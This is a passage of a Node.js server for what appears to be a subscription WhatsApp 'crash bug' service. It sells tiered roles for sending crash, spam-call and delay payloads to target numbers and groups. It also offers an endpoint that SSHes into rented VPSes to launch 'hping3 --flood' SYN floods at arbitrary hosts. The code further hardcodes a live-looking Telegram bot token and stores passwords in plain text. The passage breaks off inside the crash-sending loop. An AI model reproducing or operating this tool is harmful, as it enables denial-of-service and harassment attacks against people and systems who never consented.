const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require("@whiskeysockets/baileys");
const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const multer = require('multer');
const { exec } = require('child_process');
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "fc_invis",   bug_name: "FC NEW CELAH" },
  { bug_id: "gacor_full",   bug_name: "CHAT LOCK" },
  { bug_id: "lock",   bug_name: "CHAT LOCK DESAH" },
  { bug_id: "fc",    bug_name: "FC CLICK" },
  { bug_id: "bug_group",   bug_name: "RUSUH ROUP" },
  { bug_id: "ban_group",   bug_name: "BUG GRUP " },
  { bug_id: "hard",         bug_name: "XKILLER" },
  { bug_id: "crash_spam",   bug_name: "CRASH SPAM" },
  { bug_id: "call_flood",   bug_name: "SPAM CALL" },
  { bug_id: "click",        bug_name: "CRASH CLICK" },
  { bug_id: "XcvBebasSpam",        bug_name: "DELAY BEBAS SPAM" },
  { bug_id: "android",      bug_name: "CRASH ANDRO" },
  { bug_id: "delay",  bug_name: "DELAY INVIS" },
  { bug_id: "delayxblank",    bug_name: "DELAY X BLANK" },
  { bug_id: "crashXdelay",    bug_name: "CRASH X DELAY" },
  { bug_id: "blanknew",        bug_name: "BLANK CLICK" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "7834259292:AAHQbz08b0SZlKp8leitak2_K3INsLMhm7Q";
const bot = new TelegramBot(TOKEN, { polling: true });

// ===== ID GROUP TELEGRAM =====
const ID_GROUP = [
    -1004482349837,
];

const ID_GROUP_UTAMA = [
    -1004482349837,
];

// ===== OWNER ID =====
const OWNER_ID = 5474893948;

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

function sendToGroups(text, options = {}) {
    for (const groupid of ID_GROUP) {
        try {
            bot.sendMessage(groupid, text, options).catch(err => {
                console.error(`Gagal kirim ke ${groupid}:`, err.message);
            });
        } catch (err) {
            console.error(`Error kirim ke ${groupid}:`, err.message);
        }
    }
}

function sendToGroupsUtama(text, options = {}) {
    for (const groupid of ID_GROUP_UTAMA) {
        try {
            bot.sendMessage(groupid, text, options).catch(err => {
                console.error(`Gagal kirim ke ${groupid}:`, err.message);
            });
        } catch (err) {
            console.error(`Error kirim ke ${groupid}:`, err.message);
        }
    }
}

function kirimStatusServer(pesan) {
  try {
    bot.sendMessage(OWNER_ID, `🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" })
      .catch(err => {
        if (err.response && err.response.statusCode === 403) {
          console.log('[TELEGRAM] User belum start bot atau block, skip notif');
        } else {
          console.log('[TELEGRAM] Gagal kirim pesan:', err.message);
        }
      });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

const onlineUsers = new Set();

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        onlineUsers.add(ws.username);
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            clearInterval(interval);
            return ws.close();
          }

        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

const wsPort = 3594
server.listen(wsPort, () => {
  console.log(`🟣 Server running on
  http://cp.zyrostore.id:3594:${wsPort}`);
});

const PORT = 3594;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use('/stories', express.static('./stories'));

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 100) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public",
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://res.cloudinary.com/rrhabd1c/image/upload/f_auto,q_auto/logo",
    title: "NAFZZ CRASH",
    desc: "developer by @@harambal021"
  },
    {
    image: "https://res.cloudinary.com/wnjvno8e/image/upload/f_auto,q_auto/eren",
    title: "FITUR LENGKAP",
    desc: "thanks for using my app"
  }, 
    {
    image: "https://res.cloudinary.com/wnjvno8e/image/upload/f_auto,q_auto/aot",
    title: "SELALU TERUPDATE",
    desc: "Aman Dan Terpercaya√"
  }
];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === username && u.password === password);
  const user = db[userIdx];

  if (!user) return res.json({ valid: false });

  if (!user.pairId) {
    user.pairId = genPairId();
    db[userIdx] = user;
    saveDatabase(db);
  }

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  if (existingSession && existingSession.androidId !== androidId) {
    console.log(`[📱] Device login baru, override session untuk ${username}`);
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

const roleCooldowns = { 
  member: 250, 
  reseller: 290, 
  vip: 10, 
  admin: 60, 
  tk: 50,
  owner: 1,
  high_owner: 1,
  kingz: 1,
  founder: 1,
  developer: 1
};

const roleLevel = {
  developer: 9,
  founder: 8,
  kingz: 7,
  high_owner: 6,
  owner: 5,
  tk: 4,
  admin: 3,
  reseller: 2,
  vip: 1,
  member: 0
};

const allowedCreateRoles = ['developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin', 'reseller'];

const hierarchy = {
  developer: ['founder', 'kingz', 'high owner', 'owner', 'tk', 'admin', 'reseller', 'vip', 'member', 'developer'],
  founder: ['kingz', 'high owner', 'owner', 'tk', 'admin', 'reseller', 'vip', 'member'],
  kingz: ['high owner', 'owner', 'tk', 'admin', 'reseller', 'vip', 'member'],
  'high owner': ['owner', 'tk', 'admin', 'reseller', 'vip', 'member'],
  owner: ['tk', 'admin', 'reseller', 'vip', 'member'],
  tk: ['admin', 'reseller', 'vip', 'member'],
  admin: ['reseller', 'vip', 'member'],
  reseller: ['vip', 'member']
};

const roleLimits = {
  developer: 999,
  founder: 500,
  kingz: 300,
  high_owner: 200,
  owner: 100,
  tk: 80,
  admin: 60,
  reseller: 30
};

const allowedListRoles = ['developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin'];

const allowedLogRoles = ['developer', 'founder', 'kingz', 'high owner', 'owner'];

const allowedActiveSendersRoles = ['developer', 'founder', 'kingz', 'high owner', 'owner', 'tk', 'admin', 'vip'];

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

if (senderMode === 'global') {
  // ✅ Ambil HANYA dari publicSenderSet yang masih aktif
  const activePublicSenders = [...publicSenderSet].filter(s => activeConnections[s]);
  
  if (activePublicSenders.length === 0) {
    console.warn(`[❌] Global: tidak ada public sender aktif.`);
    console.warn(`[📊] Total publicSenderSet: ${publicSenderSet.size}, activeConnections: ${Object.keys(activeConnections).length}`);
    return;
  }
  
  const randomSender = activePublicSenders[Math.floor(Math.random() * activePublicSenders.length)];
  sock = activeConnections[randomSender];
  console.log(`[🌍] Global sender: ${randomSender}. Total aktif: ${activePublicSenders.length}`);

} else if (['vip', 'admin', 'tk', 'owner', 'high owner', 'kingz', 'founder', 'developer'].includes(role)) {
  let pool = [];
  const vipPath = path.join(__dirname, 'vip');
  const userPath = path.join('permenmd', user.username);
  
  console.log(`[🔍 DEBUG] Checking paths:`);
  console.log(`[🔍] vipPath: ${vipPath} (exists: ${fs.existsSync(vipPath)})`);
  console.log(`[🔍] userPath: ${userPath} (exists: ${fs.existsSync(userPath)})`);
  
  if (fs.existsSync(vipPath)) {
    const vipSocks = getActiveSocketsFromPath(vipPath);
    console.log(`[🔍] vip/ socks: ${vipSocks.length}`);
    pool.push(...vipSocks);
  }
  if (fs.existsSync(userPath)) {
    const userSocks = getActiveSocketsFromPath(userPath);
    console.log(`[🔍] user/ socks: ${userSocks.length}`);
    pool.push(...userSocks);
  }
  
  if (pool.length === 0) {
    console.warn(`[❌] VIP/Admin: tidak ada sock tersedia di vip/ maupun permenmd/${user.username}/`); 
    return;
  }
  sock = pool[Math.floor(Math.random() * pool.length)];
  console.log(`[👑] VIP/Admin pool: ${pool.length} sock tersedia`);
} 

else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "click":
          for (let i = 0; i < 20; i++) {
            await BlankClick(sock, targetJid);
            await sleep(300);
            await BlankNew(sock, targetJid);
            await sleep(300);
          }
          break;

